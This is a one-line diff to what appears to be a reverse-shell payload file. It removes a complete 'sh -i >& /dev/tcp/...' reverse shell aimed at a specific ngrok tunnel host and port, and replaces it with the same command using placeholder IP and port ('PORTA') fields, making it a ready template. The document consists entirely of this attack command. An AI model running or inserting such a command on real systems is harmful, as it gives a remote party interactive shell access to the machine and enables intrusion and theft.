@@ -1,1 +1,1 @@
-sh -i >& /dev/tcp/6.tcp.eu.ngrok.io/10662 0>&1
+sh -i >& /dev/tcp/( IP )/( PORTA ) 0>&1
